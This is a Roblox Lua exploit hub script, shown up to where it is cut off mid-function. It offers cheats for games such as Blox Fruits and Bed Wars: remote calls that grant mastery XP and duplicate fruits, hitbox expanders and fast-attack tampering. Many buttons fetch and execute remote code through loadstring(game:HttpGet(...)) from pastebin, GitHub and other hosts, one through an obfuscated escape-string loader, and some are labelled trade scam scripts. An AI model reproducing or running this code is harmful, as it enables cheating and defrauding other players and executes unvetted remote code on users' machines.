local Tab = Window:MakeTab({"Blox Fruits BVG"})

local Fruits = {"None", "Dragon (West) Fruit", "Dragon (East) Fruit", "Dough Fruit", "Leopard Fruit", "Flame Fruit", "Light Fruit", "Kitsune Fruit", "Hito Fruit", "Magma Fruit", "Venom Fruit", "Control Fruit"}

local Fruits1 = {"None", "Dragon (West)", "Dragon (East)", "Dough", "Leopard", "Flame","Light", "Kitsune", "Hito", "Magma", "Venom", "Control"}


local Section = Tab:AddSection({"Fruit Mastery"})

local afms = "None" 

Tab:AddDropdown({
    Name = "Select Fruit",
    Default = "None",
    Options = Fruits1,
    Callback = function(Value)
        afms = Value 
    end    
})

local Toggle = Tab:AddToggle({
    Name = "Auto Fruit Mastery",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
                local args = {
    [1] = "EMMFOSS__!ZCNSJNXCSDWQSANBX",
    [2] = "GiveMasteryEXPTO__Smthh",
    [3] = {
        [1] = game:GetService("Players").LocalPlayer,
        [2] = afms,
        [3] = 85,
        [4] = true
    }
}

game:GetService("ReplicatedStorage").ALLREMBINDS.MainRemoteEvent:FireServer(unpack(args)) 
            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})


local RunService = game:GetService("RunService")
local Toggle = Tab:AddToggle({
    Name = "Auto Farm Dragon (East) Mastery",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
         local args = {
    [1] = "EMMFOSS__!ZCNSJNXCSDWQSANBX",
    [2] = "GiveMasteryEXPTO__Smthh",
    [3] = {
        [1] = game:GetService("Players").LocalPlayer,
        [2] = "Dragon (East)",
        [3] = 85,
        [4] = true
    }
}

game:GetService("ReplicatedStorage").ALLREMBINDS.MainRemoteEvent:FireServer(unpack(args)) 
            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})

local RunService = game:GetService("RunService")
local Toggle = Tab:AddToggle({
    Name = "Auto Farm Dragon (West) Mastery",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
         local args = {
    [1] = "EMMFOSS__!ZCNSJNXCSDWQSANBX",
    [2] = "GiveMasteryEXPTO__Smthh",
    [3] = {
        [1] = game:GetService("Players").LocalPlayer,
        [2] = "Dragon (West)",
        [3] = 85,
        [4] = true
    }
}

game:GetService("ReplicatedStorage").ALLREMBINDS.MainRemoteEvent:FireServer(unpack(args)) 
            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})


local Section = Tab:AddSection({" Get Stored Fruit:aka dupe"})
local bfbvg = "None" -- Declare bfbvg outside to make it accessible

Tab:AddDropdown({
    Name = "Select Fruit",
    Default = "None",
    Options = Fruits,
    Callback = function(Value)
        bfbvg = Value -- Update bfbvg when a new option is selected
    end    
})

local Toggle = Tab:AddToggle({
    Name = "Auto Get Fruit",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
                local args = {
                    [1] = "EMMFOSS__!ZCNSJNXCSDWQSANBX",
                    [2] = "AddToolToBackpackKKK",
                    [3] = {
                        [1] = bfbvg,
                        [2] = game:GetService("Players").LocalPlayer.Backpack,
                        [3] = true,
                        [4] = true
                    }
                }

                game:GetService("ReplicatedStorage").ALLREMBINDS.MainRemoteEvent:FireServer(unpack(args))
            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})



Tab:AddButton({ 	Name  = "Dragon (West) Fruit", 	Callback = function()

 local args = {
        [1] = "EMMFOSS__!ZCNSJNXCSDWQSANBX",
        [2] = "AddToolToBackpackKKK",
        [3] = {
            [1] = "Dragon (West) Fruit",
            [2] = game:GetService("Players").LocalPlayer.Backpack,
            [3] = true,
            [4] = true
        }
    }

    game:GetService("ReplicatedStorage").ALLREMBINDS.MainRemoteEvent:FireServer(unpack(args))


end })

Tab:AddButton({ 	Name  = "Dragon (East) Fruit", 	Callback = function()


 local args = {
        [1] = "EMMFOSS__!ZCNSJNXCSDWQSANBX",
        [2] = "AddToolToBackpackKKK",
        [3] = {
            [1] = "Dragon (East) Fruit",
            [2] = game:GetService("Players").LocalPlayer.Backpack,
            [3] = true,
            [4] = true
        }
    }

    game:GetService("ReplicatedStorage").ALLREMBINDS.MainRemoteEvent:FireServer(unpack(args))

end })

local Section = Tab:AddSection({"Auto Get Stored Fruit:aka dupe"})
local Toggle = Tab:AddToggle({
    Name = "Auto Get Dragon (West) Fruit ",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
      
 local args = {
        [1] = "EMMFOSS__!ZCNSJNXCSDWQSANBX",
        [2] = "AddToolToBackpackKKK",
        [3] = {
            [1] = "Dragon (West) Fruit",
            [2] = game:GetService("Players").LocalPlayer.Backpack,
            [3] = true,
            [4] = true
        }
    }

    game:GetService("ReplicatedStorage").ALLREMBINDS.MainRemoteEvent:FireServer(unpack(args))

            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})

local Toggle = Tab:AddToggle({
    Name = "Auto Get Dragon (East) Fruit ",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
      
 local args = {
        [1] = "EMMFOSS__!ZCNSJNXCSDWQSANBX",
        [2] = "AddToolToBackpackKKK",
        [3] = {
            [1] = "Dragon (East) Fruit",
            [2] = game:GetService("Players").LocalPlayer.Backpack,
            [3] = true,
            [4] = true
        }
    }

    game:GetService("ReplicatedStorage").ALLREMBINDS.MainRemoteEvent:FireServer(unpack(args))

            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})


local Section = Tab:AddSection({"credit : Touka arbix hub"})

local Tab = Window:MakeTab({"Broken Bones"})

local Section = Tab:AddSection({"Tween Exploit"})
Tab:AddDropdown({
    Name = "Broken Bones Speed Exploit",
    Default = "None",
    Options = {"None", "Main", },
    Callback = function(Value)
        selectedOption = Value -- Update the selected option
    end
})

Tab:AddToggle({
    Name = "Tween Speed exploit",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Execute the script based on the selected option
            if selectedOption == "none" then
                -- Do something for 'none'
            elseif selectedOption == "Main" then
           local player = game.Players.LocalPlayer
local character = player.Character
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local camera = game.Workspace.CurrentCamera

local targetPosition = Vector3.new(917.9083251953125, 99.98998260498047, 2390.028564453125)
local speed = 20 -- Adjust the flying speed

local function flyToTarget()
    local direction = (targetPosition - humanoidRootPart.Position).unit
    local distance = (targetPosition - humanoidRootPart.Position).magnitude

    while distance > 1 do
        local newPosition = humanoidRootPart.Position + direction * speed * game:GetService("RunService").RenderStepped:Wait()
        humanoidRootPart.CFrame = CFrame.new(newPosition, targetPosition)
        distance = (targetPosition - humanoidRootPart.Position).magnitude
    end
end

flyToTarget()
            end
        else
            -- Handle the case when the toggle button is not active
        end
    end
})


local Tab = Window:MakeTab({"Zombie Uprising"})

Tab:AddButton({ 	Name  = "Unknowen Hub", 	Callback = function()

loadstring(game:HttpGet('https://raw.githubusercontent.com/Unknownproooolucky/Unknown-Hub-X-Universal-Games/main/Games/Zombie-Uprising'))()

end })

local Tab = Window:MakeTab({"Scripts"})
local Section = Tab:AddSection({
	Name = "Local Player"
})
Tab:AddButton({ 	Name  = "player Esp Script", 	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubEsp"))()


end })

Tab:AddParagraph("imformation","some what usfull but buggy")

Tab:AddButton({ Name = "blox fruits cmb p2", Callback = function()

_G.HitAllMobs = true
_G.BringMobs = true

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local bringDistance = 100 -- Adjust this value to set the distance threshold

function bringMobs()
    for _, mob in pairs(game.Workspace.Enemies:GetChildren()) do
        if mob:FindFirstChild("HumanoidRootPart") then
            local distance = (mob.HumanoidRootPart.Position - humanoidRootPart.Position).Magnitude
            if distance <= bringDistance then
                mob.HumanoidRootPart.CFrame = humanoidRootPart.CFrame
            end
        end
    end
end

function hitMobs()
    while _G.HitAllMobs do
        for _, mob in pairs(game.Workspace.Enemies:GetChildren()) do
            if mob:FindFirstChild("HumanoidRootPart") then
                local args = {
                    [1] = mob.HumanoidRootPart.Position,
                    [2] = mob
                }
                game:GetService("ReplicatedStorage").Remotes.Combat:FireServer(unpack(args))
            end
        end
        wait(0.1)
    end
end

if _G.BringMobs then
    while true do
        bringMobs()
        wait(0.1)
    end
end

if _G.HitAllMobs then
    hitMobs()
end

end})

Tab:AddButton({ Name = "tween cart to you made by ai", Callback = function()

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local playerPosition = character.PrimaryPart.Position

-- Change "Carts" to the name of your folder
local cartsFolder = workspace:WaitForChild("Carts")

-- Define the tween info (duration, easing style, etc.)
local tweenInfo = TweenInfo.new(
    2, -- Duration (2 seconds)
    Enum.EasingStyle.Linear, -- Easing style
    Enum.EasingDirection.Out, -- Easing direction
    0, -- Number of times to repeat
    false, -- Should it reverse
    0 -- Delay time before the tween starts
)

for _, desc in ipairs(cartsFolder:GetDescendants()) do
    if desc:IsA("BasePart") then
        -- Define the goal (the final position of the part)
        local goal = {}
        goal.Position = playerPosition

        -- Create the tween
        local tween = TweenService:Create(desc, tweenInfo, goal)
        
        -- Play the tween
        tween:Play()
    end
end


end})

Tab:AddButton({ 	Name  = "blox fruits cmb", 	Callback = function()

-- Blox Fruits Script to Hit All Mobs and Bring Them to You

_G.HitAllMobs = true
_G.BringMobs = true

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

function bringMobs()
    for _, mob in pairs(game.Workspace.Enemies:GetChildren()) do
        if mob:FindFirstChild("HumanoidRootPart") then
            mob.HumanoidRootPart.CFrame = humanoidRootPart.CFrame
        end
    end
end

function hitMobs()
    while _G.HitAllMobs do
        for _, mob in pairs(game.Workspace.Enemies:GetChildren()) do
            if mob:FindFirstChild("HumanoidRootPart") then
                local args = {
                    [1] = mob.HumanoidRootPart.Position,
                    [2] = mob
                }
                game:GetService("ReplicatedStorage").Remotes.Combat:FireServer(unpack(args))
            end
        end
        wait(0.1)
    end
end

if _G.BringMobs then
    bringMobs()
end

if _G.HitAllMobs then
    hitMobs()
end


end })

Tab:AddParagraph("imformation","some what usfull but buggy")

Tab:AddButton({ 	Name  = "player Hitbox expander Script", 	Callback = function()

local InfiniteJumpEnabled = false
game:GetService("UserInputService").JumpRequest:connect(function()
    if InfiniteJumpEnabled then
        game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
    end
end)

local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    wait(1)
    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
 
game.StarterGui:SetCore("SendNotification", {
    Title = "made by JN HH Gaming";
 
   
})
wait(1)
game.StarterGui:SetCore("SendNotification", {
    Title = "have fun killing murderer";
    Text = "Enjoy"; -- what the text says (ofc)
    Duration = 60;
})
_G.HeadSize = 20
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)


end })



local Section = Tab:AddSection({
	Name = "Stuff for Break in 2"
})

local Section = Tab:AddSection({
	Name = "Roles"
})
Tab:AddButton({
			Name = "Free Hacker Role",
			Callback = function()
				game:GetService("ReplicatedStorage").RemoteEvents.OutsideRole:FireServer("Phone", true, false)
			end
		})
Tab:AddButton({
                        Name = "Free Nerd Kid Role",
			Callback = function()
				game:GetService("ReplicatedStorage").RemoteEvents.OutsideRole:FireServer("Book", true, false)
			end
		})

local tab = Window:MakeTab({"Blox Burg"})

Tab:AddButton({ name = "soon!", Callback = function()

print("script here")

end})


local Tab = Window:MakeTab({"other hubs"})

Tab:AddButton({ name = "soon!", Callback = function()

print("script here")

end})

Tab:AddButton({ name = "soon!", Callback = function()

print("script here")

end})

Tab:AddButton({ name = "soon!", Callback = function()

print("script here")

end})

Tab:AddButton({ name = "soon!", Callback = function()

print("script here")

end})


Tab:AddButton({ Name = "Sky Hub", Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()

end})
Tab:AddButton({ Name = "Speed Hub", Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()

end})
Tab:AddButton({ Name = "Zap Hub", Callback = function()

loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()

end})

Tab:AddButton({ Name = "Game Hub", Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"))()

end})

Tab:AddButton({ Name = "HoHo Hub", Callback = function()

loadstring(game:HttpGet('https://raw.githubusercontent.com/ascn123/HOHO_H/main/Loading_UI'))()

end})


Tab:AddButton({ 	Name = "ultimate town sandbox", 	Callback = function()
loadstring(game:HttpGet("https://gitverse.ru/api/repos/stonifam/scripts/raw/branch/master/UltimateTownSandbox.lua"))()
end })

Tab:AddParagraph("imformation","????")

Tab:AddButton({ 	Name = "ice hub", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()	end })

Tab:AddParagraph("imformation","this is ment for role playing games")

Tab:AddButton({ 	Name = "Vex hub", 	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexHub"))()

 loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/Nerd-Settings"))()	end })
Tab:AddParagraph("imformation","open platform gui with mulitple scripts and gui")

Tab:AddButton({ 	Name = "Moon hub", 	Callback = function()  loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/MoonUI-v10-/main/MoonUI%20v10'))()	end })

Tab:AddParagraph("imformation","fe and more")

local Tab = Window:MakeTab({"Fe Script's"})

Tab:AddButton({ 	Name = "fling gui", 	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
end })

Tab:AddButton({ 	Name = "invisible gui", 	Callback = function() loadstring(game:HttpGet('https://pastebin.com/raw/AYtzGEPb'))()

end })

Tab:AddButton({ 	Name = "chat breaker", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/BidoSkinsYT/BidoSkinsYT/main/Fe%20lag%20chat%20Gui"))()

end})
Tab:AddParagraph("imformation","does not work")

Tab:AddButton({ 	Name = "server sound", 	Callback = function() loadstring(game:HttpGet(('https://pastebin.com/raw/ssbUfEbh'),true))()

end})
Tab:AddParagraph("imformation","only works in some games")

local Tab = Window:MakeTab({"Car Crushers 2"})

Tab:AddButton({ 	Name  = "Car Crushers 2 script", 	Callback = function()

loadstring(game:HttpGet('https://whimper.xyz/kitty'))()

end })
Tab:AddParagraph("imformation","is a car crusher script")

local Tab = Window:MakeTab({"guis"})



Tab:AddParagraph("imformation","make you invisible to other people but in some game it will have diffrent effects")


Tab:AddButton({ 	Name = "Fly gui", 	Callback = function() loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()

end})

Tab:AddParagraph("imformation","This Gui will give You the power to fly")


Tab:AddButton({ 	Name = "RTX gui", 	Callback = function() loadstring(game:HttpGet('https://pastebin.com/raw/Bkf0BJb3'))()

end})
Tab:AddParagraph("imformation","Has shader will change the look of the game")

Tab:AddButton({ 	Name = "keyboard script", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()

end})

Tab:AddParagraph("imformation","Helps with gui that are ment for pc so that you can use them on mobile")

Tab:AddButton({ 	Name = "chat troll", 	Callback = function() loadstring(game:HttpGet('https://pastebin.com/raw/MBpnp3yS'))()

end })

Tab:AddParagraph("imformation","work but on some people")



local Tab = Window:MakeTab({"Adopt me"})

Tab:AddButton({ 	Name = "AdoptMe luner event auto farm", 	Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/KodaLINEN/LFAM/main/auto'))()

end})
Tab:AddParagraph("imformation","just an adopt me hub")

local Tab = Window:MakeTab({"Bed Wars"})


Tab:AddButton({ 	Name = "bed wars Vape V4", 	Callback = function()

loadstring(game:HttpGet("https://scriptblox.com/raw/Vape-V4-For-Roblox_316"))()

end})

Tab:AddParagraph("imformation","is one of the best gui for bedwars")

Tab:AddButton({ 	Name = "bed wars God sploit", 	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/AlSploit/GodSploit/main/LoadString"))()

end})

Tab:AddParagraph("imformation","i dont recommend does not work properly")

Tab:AddButton({ 	Name = "bed war", 	Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/UmimGRRG",true))()

end})

Tab:AddParagraph("imformation","???")

Tab:AddButton({ 	Name = "bed wars infinity", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/bojoexploitz/yooo/main/itsobfuscated/InfinityHubTooOP", true))()
end})

Tab:AddParagraph("imformation","yet i do not want to use this")

Tab:AddButton({ 	Name = "bed wars jhh", 	Callback = function()loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/JN-HH-Gaming-Pro/main/JN%20HH%20Gaming%20Pro",true))()
end})

Tab:AddParagraph("imformation","and old but work bed war gui")

Tab:AddButton({ 	Name = "bed wars flame", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FlamingDrey/Flame-X-v2/main/Flame%20X%20Bedwars%20V2"))()

end})

Tab:AddParagraph("imformation","old but steal works")
local Tab = Window:MakeTab({"Pet Simulator 99"})


Tab:AddButton({ 	Name  = "zap hub", 	Callback = function()

loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()

end })

local Tab = Window:MakeTab({"Pet Simulator X"})

Tab:AddButton({ 	Name = "Pet Simulator X", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Rafacasari/roblox-scripts/main/psx.lua"))()

 end })

Tab:AddParagraph("imformation","???")

Tab:AddButton({ 	Name = "Pet Simulator X test", 	Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/BdvUGb2q"))()

 end })

Tab:AddParagraph("imformation","???")

Tab:AddButton({ 	Name = "Pet Simulator X tag", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIlllI/PartnerPSX/main/FakePartnerTag", true))()

end})

Tab:AddParagraph("imformation","just another attment at a trade scam")

Tab:AddButton({ 	Name = "psx tradescam", 	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/EasyPSX/pet-simulator-x-scam-trade/main/scam%20psx.txt"))()

end})

Tab:AddParagraph("imformation","does not work proprely")

local Tab = Window:MakeTab({"U Attack on Titens"})

Tab:AddButton({ 	Name = "U Attack on Titens 1", 	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/zhanzheng666/Roblox/main/Untitled%20Attack%20On%20Titan.lua"))()

end })

Tab:AddParagraph("imformation","Is an Untitled Attack on titen script")

local Tab = Window:MakeTab({"Blox fruits"})

Tab:AddButton({ 	Name = "Blox fruit Hoho hub", 	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/ascn123/HOHO_H/main/Loading_UI'))()	end })


Tab:AddButton({ 	Name = "Blox fruit Spectrum hub", 	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/xZPUHigh/Project-Spectrum/main/SpectrumX.lua"))()
	end })

Tab:AddButton({ 	Name = "Blox fruit Neva hub", 	Callback = function() 	loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()	end })

Tab:AddParagraph("imformation","blox fruit script that is old")

Tab:AddButton({ 	Name = "Blox fruit Ghost hub", 	Callback = function() 	loadstring(game:HttpGet('https://raw.githubusercontent.com/GGhostVN/GhostLord/main/Main'))()	end })

Tab:AddParagraph("imformation","blox fruit script that is old")

Tab:AddButton({ 	Name = "Blox-fruits-HOHOHUB", 	Callback = function()  loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
 end })

Tab:AddParagraph("imformation","blox fruit script that is updated")

Tab:AddButton({ 	Name  = "Blox fruits black trap", 	Callback = function()  loadstring(game:HttpGet("https://pastebin.com/raw/jmRUdL17"))()

end })

Tab:AddParagraph("imformation","blox fruit script that is old ")

Tab:AddButton({ 	Name  = "Blox fruits speed hub", 	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()

 end })

Tab:AddParagraph("imformation","blox fruit script is and updated script")

Tab:AddParagraph("imformation","blox fruit script")

Tab:AddButton({ 	Name  = "Blox fruits grim sim", 	Callback = function()

loadstring(game:HttpGet('https://raw.githubusercontent.com/REWzaKunGz1/premium/main/PadoHub'))()

end })

Tab:AddParagraph("imformation","blox fruit script that has been recently updated")

Tab:AddButton({ 	Name  = "Blox fruits makori", 	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/Domadicoof/Domadicoof/main/NewHubX.txt"))()

end })

Tab:AddParagraph("imformation","blox fruit script that is old")

Tab:AddButton({ 	Name  = "Blox fruits Black hub", 	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/main/BLCK"))()
end })

Tab:AddParagraph("imformation","blox fruit script that is old")


Tab:AddButton({ 	Name  = "Blox fruits Redz Hub", 	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()

end })


local Section = Tab:AddSection({
  Name = "Team"
})

Tab:AddButton({ Name = "Pirates", Callback = function()

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam","Pirates")

end})


Tab:AddButton({ Name = "marines", Callback = function()

 game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam","Marines")

end})

local Section = Tab:AddSection({
	Name = "Sea Teleport"
})
Tab:AddButton({
	Name = "Teleport To First Sea",
	Callback = function()
      	  game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelMain")
  	end
})
Tab:AddButton({
	Name = "Teleport To Second Sea",
	Callback = function()
      	 game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelDressrosa")
  	end
})
Tab:AddButton({
	Name = "Teleport To Third Sea",
	Callback = function()
      	 game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelZou")
  	end
})
local Section = Tab:AddSection({
	Name = "Ui Misc"
})

Tab:AddButton({
	Name = "Titles",
	Callback = function()
      	  local args = {
        [1] = "getTitles"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    game.Players.localPlayer.PlayerGui.Main.Titles.Visible = true
end})

Tab:AddButton({
	Name = "Devil Fruits Shop",
	Callback = function()
       game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetFruits")
        game:GetService("Players").LocalPlayer.PlayerGui.Main.FruitShop.Visible = true
end})

local Section = Tab:AddSection({
	Name = "Frags"
})
Tab:AddButton({
	Name = "Stats Refund",
	Callback = function()
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Bones","Buy",1,2)
   print('stat refund active')
end})
Tab:AddButton({
	Name = "Race Reroll",
	Callback = function()
 game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Bones","Buy",1,3)
       print('race reroll active')
end})
local Section = Tab:AddSection({
	Name = "Money"
})
Tab:AddButton({
	Name = "Roll a Random Fruit",
	Callback = function()
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Cousin","Buy")
       print('rolling random fruit active')
end})

local Section = Tab:AddSection({
	Name = "Scripts"
})

local Toggle = Tab:AddToggle({
    Name = "nearest mob farm - you have to be active",
    Default = false,
    Callback = function(Value)
        if Value then
         _G.HitAllMobs = true
_G.BringMobs = true

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local bringDistance = 55 -- Adjust this value to set the distance threshold
local offset = CFrame.new(0, -5, -6)

function bringMobs()
    for _, mob in pairs(game.Workspace.Enemies:GetChildren()) do
        if mob:FindFirstChild("HumanoidRootPart") then
            local distance = (mob.HumanoidRootPart.Position - humanoidRootPart.Position).Magnitude
            if distance <= bringDistance then
                mob.HumanoidRootPart.CFrame = humanoidRootPart.CFrame * offset
            end
        end
    end
end

function hitMobs()
    while _G.HitAllMobs do
        for _, mob in pairs(game.Workspace.Enemies:GetChildren()) do
            if mob:FindFirstChild("HumanoidRootPart") then
                local args = {
                    [1] = mob.HumanoidRootPart.Position,
                    [2] = mob
                }
                game:GetService("ReplicatedStorage").Remotes.Combat:FireServer(unpack(args))
            end
        end
        wait(0)
    end
end

if _G.BringMobs then
    while true do
        bringMobs()
        wait(0)
    end
end

if _G.HitAllMobs then
    hitMobs()
end
        else
 _G.HitAllMobs = false
_G.BringMobs = false

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local bringDistance = 55 -- Adjust this value to set the distance threshold
local offset = CFrame.new(0, -5, -6)

function bringMobs()
    for _, mob in pairs(game.Workspace.Enemies:GetChildren()) do
        if mob:FindFirstChild("HumanoidRootPart") then
            local distance = (mob.HumanoidRootPart.Position - humanoidRootPart.Position).Magnitude
            if distance <= bringDistance then
                mob.HumanoidRootPart.CFrame = humanoidRootPart.CFrame * offset
            end
        end
    end
end

function hitMobs()
    while _G.HitAllMobs do
        for _, mob in pairs(game.Workspace.Enemies:GetChildren()) do
            if mob:FindFirstChild("HumanoidRootPart") then
                local args = {
                    [1] = mob.HumanoidRootPart.Position,
                    [2] = mob
                }
                game:GetService("ReplicatedStorage").Remotes.Combat:FireServer(unpack(args))
            end
        end
        wait(0)
    end
end

if _G.BringMobs then
    while true do
        bringMobs()
        wait(0)
    end
end

if _G.HitAllMobs then
    hitMobs()
end
        end
    end
})



local Toggle = Tab:AddToggle({
    Name = "Fast Attack",
    Default = false,
    Callback = function(Value)
     local CameraShaker = require(game.ReplicatedStorage.Util.CameraShaker)
     local CombatFrameworkR = require(game:GetService("Players").LocalPlayer.PlayerScripts.CombatFramework)
     local y = debug.getupvalues(CombatFrameworkR)[2]
        _G.FastAttack = Value
        if Value then
            spawn(function()
                game:GetService("RunService").RenderStepped:Connect(function()
                    if _G.FastAttack then
                        if typeof(y) == "table" then
                            pcall(function()
                                CameraShaker:Stop()
                                y.activeController.timeToNextAttack = (math.huge^math.huge^math.huge)
                                y.activeController.timeToNextAttack = 0
                                y.activeController.hitboxMagnitude = 60
                                y.activeController.active = false
                                y.activeController.timeToNextBlock = 0
                                y.activeController.focusStart = 1655503339.0980349
                                y.activeController.increment = 1
                                y.activeController.blocking = false
                                y.activeController.attacking = false
                                y.activeController.humanoid.AutoRotate = true
                            end)
                        end
                    end
                end)
            end)

            spawn(function()
                game:GetService("RunService").RenderStepped:Connect(function()
                    if _G.FastAttack == true then
                        game.Players.LocalPlayer.Character.Stun.Value = 0
                        game.Players.LocalPlayer.Character.Humanoid.Sit = false
                        game.Players.LocalPlayer.Character.Busy.Value = false
                    end
                end)
            end)

            spawn(function()
                while wait() do
                    if sethiddenproperty then
                        sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", 100)
                    end
                    if setscriptable then
                        setscriptable(game.Players.LocalPlayer, "SimulationRadius", true)
